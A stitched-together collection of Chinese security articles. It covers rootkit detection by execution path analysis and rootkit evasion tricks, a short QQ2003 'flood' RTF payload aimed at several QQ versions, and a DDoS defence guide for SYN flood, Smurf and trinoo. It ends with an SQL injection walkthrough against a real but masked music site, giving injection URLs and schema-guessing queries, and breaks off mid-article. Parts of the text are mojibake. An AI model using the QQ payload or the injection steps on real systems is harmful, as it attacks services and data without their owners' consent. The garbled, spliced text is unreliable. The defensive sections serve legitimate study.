如果运行这个测试上百次,并计算执行指令数的平均值,我们会发现这个值是非常不确定的.考虑Win2k的复杂性,这一点也不让人吃惊.但对于我们的检测目的来说,这种现象是不能接受的.但如果我们将得到的那些值的频率分布用条形图表示出来,会发现图中有一个明显的频率高点.如图4和5中所表示那样的,即使是在系统负载很大时,频率高点所对应的数值保持不变.很难解释这个令人吃惊的现象,可能是因为在循环中同一个系统服务被调用几百次后,与这个系统服务相关的缓冲最后会被填入固定的值.
假想现在有人安装了隐藏文件的rootkit,如果我们重复测试并绘制相应的条形图,就会发现频率高点向右移了,这是因为rootkit需要进行隐藏文件的工作.
在现在的代码实现中,只进行了少量的测试,包括典型的服务如:文件系统读取,枚举进程,枚举注册表项以及Socket读取.
这些测试将有效地检测出著名的NTRootkit(见[1]),或最近比较流行的Hacker Defender(见[4]),包括它自带的网络后门,当然还包括很多其他的后门.但要检测出一些更好的后门还要加入一些新的测试.
--误报和执行路径跟踪
虽然对频率高点的检测有助于我们处理系统的不确定因素,但有时会发现测试得到的值有小的差值,一般来说不大于20.
有时这会是一个很严重的问题,因为我们不能确定那些多出来的指令意味着被入侵或只是正常的误差.
为解决这个问题,我们使用了执行路径记录模式.和单一的EPA模式比较,系统增加了对执行路径的记录(包括地址和运行的指令),首先,系统记录下正常情况下的执行路径,以后的每一次运行将产生diff文件(正常系统和现行系统之间的比较).
我们应该使用好的反编译器来分析那些不一样的地方,以此判定他们是否可疑.图6是一个diff文件的例子.
现阶段的diff文件只记录下指令的地址,以后可能将两次测试的不同结果存为PE格式文件,并可用IDA等工具分析.
--检测 ”offset-in-the-code” 的变化
想象有这样一个rootkit,它基本和上面提到的 fu rootkit (见[3]) 一样,但不从PsActiveProcessList中,而是从分派器使用的数据结构中移除进程.我说过那不可能,因为隐藏的进程将分配不到运行时间......
然而,rootkit可以同时更改分派器代码中所使用数据结构的地址(offset),换句话说,就是使其使用不同的链表.但只有分派器使用这个”新的” 链表,而系统其他地方还是使用”旧的”链表...... (见图7).
虽然这种技术不会改变执行指令的个数,我们还是能检测到它,但需要进一步的完善现有的工具.这项功能现在还没有实现,但应该不是很难.
--针对EPA的攻防
我们可以想到一些能骗过EPA类检测工具的方法,先把它们分为两类.
1. 针对特定工具的欺骗
2. 对EPA类技术的通用攻击
首先,我们考虑一下通用的攻击方法和怎样防止这类攻击.接着讨论针对特定工具的攻击以及怎样通过多态来预防.
--对EPA类技术的通用攻击
首先,恶意程序可以勾连包含除错处理程序(debug handler)地址的IDT入口1,这样将暂停记录运行的指令数.当它完成工作时,再恢复 IDT入口1.这样rootkit中所执行的指令数不会被记录.
我们可以使用intel的除错寄存器来防止这类的攻击.可以使用DR0和DR1寄存器对IDT入口1进行写保护.并且为防止rootkit向除错处理程序的开始处写入Jmp指令,还需对其进行读保护.换句话说,我们不想让rootkit发现除错处理程序的地址.但单纯对IDT入口进行读保护是不行的,系统会蓝屏.但有一简单的解决方法,就是增加额外的一层.见图9.
还有一种攻击的方法,在rootkit运行时,其将TF位清零,并在恶意操作完成时恢复TF位,这样检测工具也只能发现运行的指令数和正常的系统有细微差别.
另外,rootkit还能检查TF位, 如发现被跟踪,则不进行恶意操作.这种行为并不会影响rootkit的正常工作,因为只有被检测的进程才被设置TF位.
我们可以防止这种攻击,应该注意到的是运行每一个系统指令前,都会运行我们的除错处理程序.以下是简单的防预方法:
如果除错处理程序发现上一个运行指令是pushf(将EFLAGS寄存器压入堆栈),则运行如下操作.
and [esp], 0xfffffeff;
及清TF位.同样,如果下一条指令是popf(从堆栈载入EFLAGS的值),则运行如下操作.
or [esp],0x100;
及设TF位.这样rootkit就不能更改TF位.
这样的预防几乎可够了,但还不充分.Rootkit仍能以以下方法发现其被跟踪:
setTFbit();
if (checkTFbit()!=1) {
//we are traced!
}
所以我们需要更改反检测部分的操作,使其可以记录TF位有没有被rootkit更改(比如增加一个TFbitset变量).
popf/pushf不是存取EFLAGS寄存器的唯一指令,其它像iret/int等指令也可以[注2],因此还要加入对这些指令的检测.
对EGLAGS寄存器的防护部分还没有被实现.一部分原因是通过对diff文件的分析也可以发现这类攻击.但以后会增加相应代码.
--对特定工具的攻击
如果攻击者了解关于特定检测工具的一切,他会有很多种欺骗的手段.比如,可以更改保存指令数的那个变量.
不过这类攻击具有很强的针对性,如果有很多不同(或非单一版本)的EPA类工具,这样的攻击将不会有效.
当然,我们还是希望可以阻止这类攻击,强大的多态代码生成器可能是唯一的方法.当管理员安装检测工具是,会产生一个独特的内核驱动和测试程序.
多态代码生成器部分还没有被实现.
--相关工作
像文章开头所述,笔者还没有发现任何对rootkit的检测方法,不是基于存储扫描的.
EPA技术并不被OS所局限,笔者在linux下也实现了一相关工具,参5中有对其的详述以及简单的代码实现.

References
[1] Greg Hoglund, et al, ROOTKIT home, telnet://rootkit.com,
[2] palmers, Sub proc_root Quando Sumus, Phrack Magazine, issue 58, 2001.
[3] fuzen_op, fu rootkit, telnet://rootkit.com,
[4] Holy Father, Hacker Defender Home, http://rootkit.host.sk,
[5] Jan Rutkowski, Execution path analysis, Phrack Magazine, issue 59, 2002.
[6] IA-32 Intel Architecture Software Developer’s Manual, vol1-3.

注1: 作者相信这三个链表包含了系统中所有的线程.但还需进一步研究.
注2: 参6上列举了所有和EFLAGS寄存器交互的指令
QQ2003III刷屏代码
漏洞涉及的QQ版本为：
QQ2003III测试版
QQ2003II
QQ2003
QQ2000c 
{\urtf1\ansi\ansicpg936\deff0\deflang1033\deflangfe2052{\fonttbl{\f0
\fnil\fcharset2webdings;}{\f1\fnil\fcharset134\'cb\'ce\'cc\'e5;}}
{\colortbl;\red3300\green22\blue0;}\viewkind4\ucl\pard\cf1\lang2052\f0\fs1638g\cf0\f1\fs18
\par
}
几种分布式攻击(ICMP、SYN Flood、Smurf) 的防范
拒绝服务攻击是一种遍布全球的系统漏洞，黑客们正醉心于对它的研究，而无数的网络用户将成为这种攻击的受害者。Tribe　Flood　Network,　tfn2k,　smurf,　targa…还有许多的程序都在被不断的开发出来。这些程序想瘟疫一样在网络中散布开来，使得我们的村落更为薄弱，我们不得不找出一套简单易用的安全解决方案来应付黑暗中的攻击。 
　　由于我们防范手段的加强，拒绝服务攻击手法也在不断的发展。 Tribe　Flood　Network　(tfn)　和tfn2k引入了一个新概念：分布式。这些程序可以使得分散在互连网各处的机器共同完成对一台主机攻击的操作，从而使主机看起来好象是遭到了不同位置的许多主机的攻击。这些分散的机器由几台主控制机操作进行多种类型的攻击，如UDP　flood,　SYN　flood等。
　　操作系统和网络设备的缺陷在不断地被发现并被黑客所利用来进行恶意的攻击。如果我们清楚的认识到了这一点，我们应当使用下面的两步来尽量阻止网络攻击保护我们的网络:尽可能的修正已经发现的问题和系统漏洞。识别，跟踪或禁止这些令人讨厌的机器或网络对我们的访问。
　　我们先来关注第二点我们面临的主要问题是如何识别那些恶意攻击的主机，特别是使用拒绝服务攻击的机器。因为这些机器隐藏了他们自己的地址，而冒用被攻击者的地址。攻击者使用了数以千记的恶意伪造包来使我们的主机受到攻击。"tfn2k"的原理就象上面讲的这么简单，而他只不过又提供了一个形象的界面。假如您遭到了分布式的拒绝服务攻击，实在是很难处理。 
　　有一些简单的手法来防止拒绝服务式的攻击。最为常用的一种当然是时刻关注安全信息以期待最好的方法出现。管理员应当订阅安全信息报告，实时的关注所有安全问题的发展。：） 第二步是应用包过滤的技术，主要是过滤对外开放的端口。这些手段主要是防止假冒地址的攻击，使得外部机器无法假冒内部机器的地址来对内部机器发动攻击。
　　对于应该使用向内的包过滤还是使用向外的包过滤一直存在着争论。RFC　2267建议在全球范围的互连网上使用向内过滤的机制，但是这样会带来很多的麻烦，在中等级别的路由器上使用访问控制列表不会带来太大的麻烦，但是已经满载的骨干路由器上会受到明显的威胁。另一方面，ISP如果使用向外的包过滤措施会把过载的流量转移到一些不太忙的设备上。　ISP也不关心消费者是否在他们的边界路由器上使用这种技术。当然，这种过滤技术也并不是万无一失的，这依赖于管理人员采用的过滤机制。 
1．ICMP防护措施 
　　ICMP最初开发出来是为了"帮助"网络，经常被广域网管理员用作诊断工具。但今天各种各样的不充分的ICMP被滥用，没有遵守RFC 792原先制订的标准，要执行一定的策略可以让它变得安全一些。 
　　入站的ICMP时间标记（Timestamp）和信息请求(Information Request)数据包会得到响应，带有非法或坏参数的伪造数据包也能产生ICMP参数问题数据包，从而允许另外一种形式的主机搜寻。这仍使得站点没有得到适当保护。 
　　以秘密形式从主方到客户方发布命令的一种通用方法，就是使用ICMP Echo应答数据包作为载波。 回声应答本身不能回答，一般不会被防火墙阻塞。 
　　首先，我们必须根据出站和入站处理整个的"ICMP限制"问题。ICMP回声很容易验证远程机器，但出站的ICMP回声应该被限制只支持个人或单个服务器/ICMP代理（首选）。 
　　如果我们限制ICMP回声到一个外部IP地址（通过代理），则我们的ICMP回声应答只能进入我们网络中预先定义的主机。 
　　重定向通常可以在路由器之间找到，而不是在主机之间。防火墙规则应该加以调整，使得这些类型的ICMP只被允许在需要信息的网际连接所涉及的路由器之间进行。 
　　建议所有对外的传输都经过代理，对内的ICMP传输回到代理地址的时候要经过防火墙。这至少限制了ICMP超时数据包进入一个内部地址，但它可能阻塞超时数据包。 
　　当ICMP数据包以不正确的参数发送时，会导致数据包被丢弃，这时就会发出ICMP参数出错数据包。主机或路由器丢弃发送的数据包，并向发送者回送参数ICMP出错数据包，指出坏的参数。 
　　总的来说，只有公开地址的服务器（比如Web、电子邮件和FTP服务器）、防火墙、联入因特网的路由器有真正的理由使用ICMP与外面的世界对话。如果调整适当，实际上所有使用进站和出站ICMP的隐密通讯通道都会被中止。 
2. SYN Flood防范
　　SYN Flood是当前最流行的DoS（拒绝服务攻击）与DdoS（分布式拒绝服务攻击）的方式之一，这是一种利用TCP协议缺陷，发送大量伪造的TCP连接请求，从而使得被攻击方资源耗尽（CPU满负荷或内存不足）的攻击方式。对于SYN Flood攻击，目前尚没有很好的监测和防御方法，不过如果系统管理员熟悉攻击方法和系统架构，通过一系列的设定，也能从一定程度上降低被攻击系统的负荷，减轻负面的影响。
　　一般来说，如果一个系统（或主机）负荷突然升高甚至失去响应，使用Netstat 命令能看到大量SYN_RCVD的半连接（数量>500或占总连接数的10%以上），可以认定，这个系统（或主机）遭到了SYN Flood攻击。遭到SYN Flood攻击后，首先要做的是取证，通过Netstat –n –p tcp >resault.txt记录目前所有TCP连接状态是必要的，如果有嗅探器，或者TcpDump之类的工具，记录TCP SYN报文的所有细节也有助于以后追查和防御，需要记录的字段有：源地址、IP首部中的标识、TCP首部中的序列号、TTL值等，这些信息虽然很可能是攻击者伪造的，但是用来分析攻击者的心理状态和攻击程序也不无帮助。特别是TTL值，如果大量的攻击包似乎来自不同的IP但是TTL值却相同，我们往往能推断出攻击者与我们之间的路由器距离，至少也可以通过过滤特定TTL值的报文降低被攻击系统的负荷（在这种情况下TTL值与攻击报文不同的用户就可以恢复正常访问）。从防御角度来说，有几种简单的解决方法：
£牐 2.1£犓醵蘏YN Timeout时间:由于SYN Flood攻击的效果取决于服务器上保持的SYN半连接数，这个值=SYN攻击的频度 x SYN Timeout，所以通过缩短从接收到SYN报文到确定这个报文无效并丢弃改连接的时间，例如设置为20秒以下（过低的SYN Timeout设置可能会影响客户的正常访问），可以成倍的降低服务器的负荷。
£牐 2.2£犐柚肧YN Cookie:就是给每一个请求连接的IP地址分配一个Cookie，如果短时间内连续受到某个IP的重复SYN报文，就认定是受到了攻击，以后从这个IP地址来的包会被丢弃。可是上述的两种方法只能对付比较原始的SYN Flood攻击，缩短SYN Timeout时间仅在对方攻击频度不高的情况下生效，SYN Cookie更依赖于对方使用真实的IP地址，如果攻击者以数万/秒的速度发送SYN报文，同时利用SOCK_RAW随机改写IP报文中的源地址，以上的方法将毫无用武之地。
£牐 2.3£牳悍蠢〔呗Ô:参考一些流行的操作系统，如Windows2000的SYN攻击保护机制：正常情况下，OS对TCP连接的一些重要参数有一个常规的设置： SYN Timeout时间、SYN-ACK的重试次数、SYN报文从路由器到系统再到Winsock的延时等等。这个常规设置针对系统优化，可以给用户提供方便快捷的服务；一旦服务器受到攻击，SYN Half link 的数量超过系统中TCP活动 Half Connction最大连接数的设置，系统将会认为自己受到了SYN Flood攻击，并将根据攻击的判断情况作出反应：减短SYN Timeout时间、减少SYN-ACK的重试次数、自动对缓冲区中的报文进行延时等等措施，力图将攻击危害减到最低。如果攻击继续，超过了系统允许的最大Half Connection 值，系统已经不能提供正常的服务了，为了保证系统不崩溃，可以将任何超出最大Half Connection 值范围的SYN报文随机丢弃，保证系统的稳定性。

£牐犓ù以，可以事先测试或者预测该主机在峰值时期的Half Connction 的活动数量上限，以其作为参考设定TCP活动 Half Connction最大连接数的值，然后再以该值的倍数（不要超过2）作为TCP最大Half Connection值，这样可以通过负反馈的手段在一定程度上阻止SYN攻击。
£牐 2.4£犕巳貌呗Ô:退让策略是基于SYN Flood攻击代码的一个缺陷，我们重新来分析一下SYN Flood攻击者的流程：SYN Flood程序有两种攻击方式，基于IP的和基于域名的，前者是攻击者自己进行域名解析并将IP地址传递给攻击程序，后者是攻击程序自动进行域名解析，但是它们有一点是相同的，就是一旦攻击开始，将不会再进行域名解析，我们的切入点正是这里：假设一台服务器在受到SYN Flood攻击后迅速更换自己的IP地址，那么攻击者仍在不断攻击的只是一个空的IP地址，并没有任何主机，而防御方只要将DNS解析更改到新的IP地址就能在很短的时间内（取决于DNS的刷新时间）恢复用户通过域名进行的正常访问。为了迷惑攻击者，我们甚至可以放置一台“牺牲”服务器让攻击者满足于攻击的“效果”（由于DNS缓冲的原因，只要攻击者的浏览器不重起，他访问的仍然是原先的IP地址）。
£牐 2.5£牱植际紻NS负载均衡:在众多的负载均衡架构中，基于DNS解析的负载均衡本身就拥有对SYN Flood的免疫力，基于DNS解析的负载均衡能将用户的请求分配到不同IP的服务器主机上，攻击者攻击的永远只是其中一台服务器，一来这样增加了攻击者的成本，二来过多的DNS请求可以帮助我们追查攻击者的真正踪迹（DNS请求不同于SYN攻击，是需要返回数据的，所以很难进行IP伪装）。
£牐 2.6£牱阑鹎絈os:对于防火墙来说，防御SYN Flood攻击的方法取决于防火墙工作的基本原理，一般说来，防火墙可以工作在TCP层之上或IP层之下，工作在TCP层之上的防火墙称为网关型防火墙，网关型防火墙布局中，客户机与服务器之间并没有真正的TCP连接，客户机与服务器之间的所有数据交换都是通过防火墙代理的，外部的DNS解析也同样指向防火墙，所以如果网站被攻击，真正受到攻击的是防火墙，这种防火墙的优点是稳定性好，抗打击能力强，但是因为所有的TCP报文都需要经过防火墙转发，所以效率比较低由于客户机并不直接与服务器建立连接，在TCP连接没有完成时防火墙不会去向后台的服务器建立新的TCP连接，所以攻击者无法越过防火墙直接攻击后台服务器，只要防火墙本身做的足够强壮，这种架构可以抵抗相当强度的SYN Flood攻击。但是由于防火墙实际建立的TCP连接数为用户连接数的两倍（防火墙两端都需要建立TCP连接），同时又代理了所有的来自客户端的TCP请求和数据传送，在系统访问量较大时，防火墙自身的负荷会比较高，所以这种架构并不能适用于大型网站。（我感觉，对于这样的防火墙架构，使用TCP_STATE攻击估计会相当有效:）
£牐牴ぷ髟贗P层或IP层之下的称为路由型防火墙，其工作原理有所不同：客户机直接与服务器进行TCP连接，防火墙起的是路由器的作用，它截获所有通过的包并进行过滤，通过过滤的包被转发给服务器，外部的DNS解析也直接指向服务器，这种防火墙的优点是效率高，可以适应100Mbps-1Gbps的流量，但是这种防火墙如果配置不当，不仅可以让攻击者越过防火墙直接攻击内部服务器，甚至有可能放大攻击的强度，导致整个系统崩溃。
£牐犜谡饬街只ù本模型之外，有一种新的防火墙模型，它集中了两种防火墙的优势，这种防火墙的工作原理如下所示：
第一阶段，客户机请求与防火墙建立连接： 
第二阶段，防火墙伪装成客户机与后台的服务器建立连接 
第三阶段，之后所有从客户机来的TCP报文防火墙都直接转发给后台的服务器 
£牐犝庵纸峁刮ü取了上两种防火墙的优点，既能完全控制所有的SYN报文，又不需要对所有的TCP数据报文进行代理，是一种两全其美的方法。近来，国外和国内的一些防火墙厂商开始研究带宽控制技术，如果能真正做到严格控制、分配带宽，就能很大程度上防御绝大多数的SYN攻击。
3.Smurf防范的几种方法
　　阻塞Smurf攻击的源头:Smurf攻击依靠攻击者的力量使用欺骗性源地址发送echo请求。用户可以使用路由路的访问保证内部网络中发出的所有传输信息都具有合法的源地址，以防止这种攻击。这样可以使欺骗性分组无法找到反弹站点。
　　阻塞Smurf的反弹站点:用户可以有两种选择以阻塞Smurf攻击的反弹站点。第一种方法可以简单地阻塞所有入站echo请求，这们可以防止这些分组到达自己的网络。如果不能阻塞所有入站echo请求，用户就需要让自己的路由器把网络广播地址映射成为LAN广播地址。制止了这个映射过程，自己的系统就不会再收到这些echo请求。
　　阻止Smurf平台:为防止系统成为 smurf攻击的平台，要将所有路由器上IP的广播功能都禁止。一般来讲，IP广播功能并不需要。 如果攻击者要成功地利用你成为攻击平台，你的路由器必须要允许信息包以不是从你的内网中产生的源地址离开网络。配置路由器，让它将不是由你的内网中生成的信息包过滤出去，这是有可能做到的。这就是所谓的网络出口过滤器功能。
　　防止Smurf攻击目标站点:除非用户的ISP愿意提供帮助，否则用户自己很难防止Smurf对自己的WAN接连线路造成的影响。虽然用户可以在自己的网络设备中阻塞这种传输，但对于防止Smurf吞噬所有的WAN带宽已经太晚了。但至少用户可以把Smurf的影响限制在外围设备上。通过使用动态分组过滤技术，或者使用防火墙，用户可以阻止这些分组进入自己的网络。防火墙的状态表很清楚这些攻击会话不是本地网络中发出的（状态表记录中没有最初的echo请求记录），因些它会象对待其它欺骗性攻击行为那样把这样信息丢弃。 
4.UDP Flood防范
　　以前文提到的trinoo为例，分析如下：
在master程序与代理程序的所有通讯中，trinoo都使用了UDP协议。入侵检测软件能够寻找使用UDP协议的数据流(类型17)。 
Trinoo master程序的监听端口是27655，攻击者一般借助telnet通过TCP连接到master程序所在计算机。入侵检测软件能够搜索到使用TCP (类型6)并连接到端口27655的数据流。 
所有从master程序到代理程序的通讯都包含字符串"l44"，并且被引导到代理的UDP 端口27444。入侵检测软件检查到UDP 端口27444的连接，如果有包含字符串l44的信息包被发送过去，那么接受这个信息包的计算机可能就是DDoS代理。 
Master和代理之间通讯受到口令的保护，但是口令不是以加密格式发送的，因此它可以被“嗅探”到并被检测出来。使用这个口令以及来自Dave Dittrich的trinot脚本http://staff.washington.edu/dittrich/misc/trinoo.analysis，要准确地验证出trinoo代理的存在是很可能的。 
　　一旦一个代理被准确地识别出来，trinoo网络就可以安装如下步骤被拆除： 
在代理daemon上使用"strings"命令，将master的IP地址暴露出来。 
与所有作为trinoo master的机器管理者联系，通知它们这一事件。 
在master计算机上，识别含有代理IP地址列表的文件(默认名"...")，得到这些计算机的IP地址列表。 
向代理发送一个伪造"trinoo"命令来禁止代理。通过crontab 文件(在UNIX系统中)的一个条目，代理可以有规律地重新启动， 因此，代理计算机需要一遍一遍地被关闭，直到代理系统的管理者修复了crontab文件为止。 
检查master程序的活动TCP连接，这能显示攻击者与trinoo master程序之间存在的实时连接。 
如果网络正在遭受trinoo攻击，那么系统就会被UDP 信息包所淹没。Trinoo从同一源地址向目标主机上的任意端口发送信息包。探测trinoo就是要找到多个UDP信息包，它们使用同一来源IP地址、同一目的IP地址、同一源端口，但是不同的目的端口。 
在http://www.fbi.gov/nipc/trinoo.htm上有一个检测和根除trinoo的自动程序。 
5.使用DNS来跟踪匿名攻击 
　　从一个网管的观点来看，防范的目标并不是仅仅阻止拒绝服务攻击，而是要追究到攻击的发起原因及操作者。当网络中有人使用假冒了源地址的工具（如tfn2k）时，我们虽然没有现成的工具来确认它的合法性，但我们可以通过使用DNS来对其进行分析： 
　　假如攻击者选定了目标www.ttttt.com，他必须首先发送一个DNS请求来解析这个域名，通常那些攻击工具工具会自己执行这一步，调用gethostbyname()函数或者相应的应用程序接口，也就是说，在攻击事件发生前的DNS请求会提供给我们一个相关列表，我们可以利用它来定位攻击者。 
　　使用现成工具或者手工读取DNS请求日志，来读取DNS可疑的请求列表都是切实可行的，然而，它有三个主要的缺点： 
　　攻击者一般会以本地的DNS为出发点来对地址进行解析查询，因此我们查到的DNS请求的发起者有可能不是攻击者本身，而是他所请求的本地DNS服务器。尽管这样，如果攻击者隐藏在一个拥有本地DNS的组织内，我们就可以把该组织作为查询的起点。 
　　攻击者有可能已经知道攻击目标的IP地址，或者通过其他手段（host,　ping）知道了目标的IP地址，亦或是攻击者在查询到IP地址后很长一段时间才开始攻击，这样我们就无法从DNS请求的时间段上来判断攻击者（或他们的本地服务器）。 
　　DNS对不同的域名都有一个却省的存活时间，因此攻击者可以使用存储在DNS缓存中的信息来解析域名。为了更好做出详细的解析记录，您可以把DNS却省的TTL时间缩小，但这样会导致DNS更多的去查询所以会加重网络带宽的使用。 
6.主机防范 
　　所有对因特网提供公开服务的主机都应该加以限制。下面建议的策略可以保护暴露在因特网上的主机。 
将所有公开服务器与DMZ隔离 
提供的每种服务都应该有自己的服务器。 
如果使用Linux（建议这样做），你就可以使用一个或几个"缓冲溢出/堆栈执行"补丁或增强来防止绝大多数（如果不能全部）本地或远程缓冲溢出，以避免这些溢出危及根的安全。强烈建议将Solar Designer的补丁包括在附加的安全特征中。 
使用SRP（Secure Remote Password 安全远程口令）代替SSH。 
限制只有内部地址才能访问支持SRP的telnet和FTP守护程序，强调只有支持SRP的客户端才可以与这些程序对话。如果你必须为公开访问运行常规的FTP（比如匿名FTP），可以在另一个端口运行SRP FTP。 
使用可信任的路径。根用户拥有的二进制执行程序应该放置的目录的所有权应该是根，不能让全部用户或组都有写权限。如果有必要的话，为了强制这样做，你可以改变内核。 
使用内置防火墙功能。通过打开防火墙规则，可以经常利用内核状态表。 
使用一些防端口扫描措施。这可以使用Linux的后台程序功能或通过修改内核实现。 
使用Tripwire 和相同作用的软件来帮助发觉对重要文件的修改。 
7.电子邮件炸弹防护
　　对于保护电子件的安全来说，了解一下电子邮件的发送过程是很有必要的。它的过程是这样的，当有用户将邮件写好之后首先连接到邮件服务器上，当邮件服务器有响应时便会启动邮件工具，调用路由（这里指的是邮件的路由）程序Sendmail进行邮件路由，根据邮件所附的接收地址中指定的接收主机，比如： a@163.net里的163.net，与位于主机163.net电子邮件后台守护程序建立25端口的TCP连接，建立后双方按照SMTP协议进行交互第进，从而完成邮件的投递工作，接收方电子邮件接收邮件后，再根据接收用户名称，放置在系统的邮件目录里，如/usr/电子邮件目录的semxa文件中。接收用户同样使用邮件工具获取和阅读这些已投递的邮件。如果投递失败的话，这些邮件将重新返回到发送方。实际上电子邮件的发送过程要比这里所说的更为复杂些，在过程里将会涉及很多的配置文件。在现在的SMTP协议是一个基于文本的协议，理解和实现都相对比较简单些，你可以使用telnet直接登陆到邮件服务器的25端口（由LANA授权分配给SMTP协议）进行交互。 
　　保护电子信箱邮件的信息安全最有效的办法就是使用加密的签名技术，像PGP来验证邮件，通过验证可以保护到信息是从正确的地方发来的，而且在传送过程中不被修改。但是这就不是个人用户所能达到的了，因为PGP比较复杂。 
　　就电子邮件炸弹而言，保护还是可以做得很好的。因为它的复杂性不是很高，多的仅仅是垃圾邮件而已。你可以使用到http://semxa.kstar.com/hacking/echom201.zip E-mail Chomper（砍信机）来保护自己。但是目前就国内用户而言，大多用户所使用的都是免费的邮箱，像yeah.net、163.net、263.net等，即便是有人炸顶多也是留在邮件服务器上了，危害基本上是没有的。如果是用pop3接的话，可以用Outlook或Foxmail等pop的收信工具来接收的mail，大多用户使用的是windows的Outlook Express，可以在“工具－收件箱助理”中设置过滤。对于各种利用电子邮件而传播的Email蠕虫病毒和对未知的Emai蠕虫病毒你可以使用防电子邮件病毒软件来防护。
　　另外，邮件系统管理员可以使用“黑名单”来过滤一些垃圾信件。对于不同的邮件系统，大都可以在网络上找到最新的黑名单程序或者列表。
8.使用ngrep工具来处理tfn2k攻击 
　　根据使用DNS来跟踪tfn2k驻留程序的原理，现在已经出现了称为ngrep的实用工具。经过修改的ngrep可以监听大约五种类型的tfn2k拒绝服务攻击(targa3,　SYN　flood,　UDP　flood,　ICMP　flood　和　smurf)，它还有一个循环使用的缓存用来记录DNS和ICMP请求。如果ngrep发觉有攻击行为的话，它会将其缓存中的内容打印出来并继续记录ICMP回应请求。假如攻击者通过ping目标主机的手段来铆定攻击目标的话，在攻击过程中或之后记录ICMP的回应请求是一种捕获粗心的攻击者的方法。由于攻击者还很可能使用其他的服务来核实其攻击的效果（例如web），所以对其他的标准服务也应当有尽量详细的日志记录。 
　　还应当注意，ngrep采用的是监听网络的手段，因此，ngrep无法在交换式的环境中使用。但是经过修改的ngrep可以不必和你的DNS在同一个网段中，但是他必须位于一个可以监听到所有DNS请求的位置。经过修改的ngrep也不关心目标地址，您可以把它放置在DMZ网段，使它能够检查横贯该网络的tfn2k攻击。从理论上讲，它也可以很好的检测出对外的tfn2k攻击。 
　　在ICMP　flood事件中，ICMP回应请求的报告中将不包括做为tfn2k　flood一部分的ICMP包。Ngrep还可以报告检测出来的除smurf之外的攻击类型（TARGA,　UDP,　SYN,　ICMP等）。混合式的攻击在缺省情况下表现为ICMP攻击，除非你屏蔽了向内的ICMP回应请求，这样它就表现为UDP或SYN攻击。这些攻击的结果都是基本类似的。 
9.有关入侵检测系统的建议 
　　由于许多用来击败基于网络的入侵检测系统的方法对绝大多数商业入侵检测系统产品仍然是有效的，因此建议入侵检测系统应该至少有能重组或发觉碎片的自寻址数据包。下面是部分要注意的事项： 
确信包括了现有的所有规则，包括一些针对分布式拒绝服务攻击的新规则。如果遵循了ICMP建议项，许多ICMP会被阻塞，入侵检测系统触发器存在许多机会。任何通常情况下要被阻塞的入站或出站的ICMP数据包可以被触发。 "任何"被你用防火墙分离的网络传输都可能是一个潜在的IDS触发器。 
如果你的入侵检测系统支持探测长时间周期的攻击，确信没有把允许通过防火墙的被信任主机排除在外。这也包括虚拟专用网。 如果你能训练每个使用ping的用户在ping主机时使用小数据包，就可能设置入侵检测系统寻找超29字节的Echo和Echo应答数据包。
SQL Injection的深入探讨
SQL Injection这个话题越来越热了，很多的论坛和hack站点都或多或少地在谈论这个问题，当然也有很多革命前辈写了N多的关于这方面的文章，所利用的也是许多知名的程序，比如动网，尘缘雅境，而我们也可以拿到免费的程序来看其中的漏洞和数据库的结构，从中来达到注入的目的，不过如果是别人自己写的程序，那么我们就不知道他的源代码，更不知道他的数据库结构（数据表名和其中的字段名），就算有个变量未过滤提交到数据库去，我们也是无从对其下手的，只能利用通过猜解他的数据库结构来构造相应的SQL语句，那么是不是就到此为止，能猜到多少是多少呢？没有做不到的，只有想不到的，我相信这篇文章对研究SQL Injection朋友来说，应该会有所启发。 
一、发现漏洞，常规注入
最近帮我们的站增加音乐，虽然本地的电信的音乐资源库非常丰富，但是缺少有关歌手和专辑的资料，所以到网上去闲逛找点有用的图片和歌手简介，通过百度搜索到了一个mp3的音乐超市，里面的资料还是比较丰富的，拷贝的同时顺手在他的Specialid=1817后面加了一个'（单引号），我突然眼前一亮：
Microsoft OLE DB Provider for SQL Server 错误 '80040e14' 
字符串 '' 之前有未闭合的引号。 
/showspecial.asp，行13 
（见pic/1.gif）
Specialid没有过滤掉单引号就直接用到SQL语句中去了，而且是SQL SERVER版本的，漏洞的可利用性极大，可不能就此放过这么好的练兵机会，接着换;（分号）提交进去，居然页面正常出来了，说明该变量也没有过滤掉;号，到这里，我们就可以对此进行SQL渗透了，按照常规的步骤：
1、提交http://********/showspecial.asp?Specialid=1817;use master;--
注：--的作用是注释掉程序中后面的SQL语句，以防对我们构造的语句有影响，比如order by..
出现
Microsoft OLE DB Provider for SQL Server 错误 '80040e21' 
多步 OLE DB 操作产生错误。如果可能，请检查每个 OLE DB 状态值。没有工作被完成。 
/showspecial.asp，行13 
（见pic/2.gif）
想在他的数据库里增加一个管理员是不可能了，我们再换一种方法
2、提交http://********/showspecial.asp?Specialid=1817 and 1<>(select count(id) from [user])
这一句的意思是猜猜看是不是存在一个名为user的表和他里面有没有id这个字段
一般来说:
如果不存在该表的话，会出现
Microsoft OLE DB Provider for SQL Server 错误 '80040e37' 
对象名 'user' 无效。 
/showspecial.asp，行13 
不存在该字段的话，会出现
Microsoft OLE DB Provider for SQL Server 错误 '80040e14' 
列名 'id' 无效。 
/showspecial.asp，行13 
注：一般来说，第一步是猜一些公共的表，这里所指的公共表的意思是大多数的程序员在写设计数据库结构的时候会用到的常用的表和字段，比如新闻的news表中的编号字段id，标题字段title，用户表user或者user_data中的编号字段id，用户名字段username，当然你也可以在该站点的登陆界面看他的原代码，找到用户名和密码的表单的name值，那个也经常会是表字段名的真实值，如<INPUT type=text name=username size=15>
很幸运，果然存在user表和id字段
3、通过提交http://********/showspecial.asp?Specialid=1817 and 1<>(select count(username) from [user])
这里的username是根据登陆框的表单名去猜的，恰好存在该字段
于是在该站注册了一个用户名为rrrrr的用户，作为注入的平台，得到我的用户名的id值103534
（见pic/3.gif）
4、继续猜下去，这里我还是利用的他程序中的表单名，提交
http://********/showspecial.asp?Specialid=1817 and 1<>(select count(email) from [user])
也存在，好了，到这里，我们的平台已经搭建好了。
二、深入研究，让SQL自己招数据库结构
很多时候，我们只能猜到大家比较熟用的表名，如果是非原程序公开下载的，我们很猜到他的真实数据库结构，有时候猜半天都猜不到，令人很郁闷，那么该如何拿到他的表结构呢？我们知道SQL SERVER的每一个数据库都会有用户表和系统表，根据SQL SERVER的联机帮助描述是系统表sysobjects：在数据库内创建的每个对象（约束、默认值、日志、规则、存储过程等）在表中占一行，那么也就是说当前数据库的表名都会在该表内有存在，（对象名 'admin' 无效。大家可以看到上面出现的报错把表名描述成对象）。
我们要用的是其中的3个，描述如下（详细的见SQL SERVER的联机帮助）：
name 数据表的名字
xtype 数据表的类型 u为用户表
id 数据表的对象标志
status 保留字段，用户表一般都是大于0的
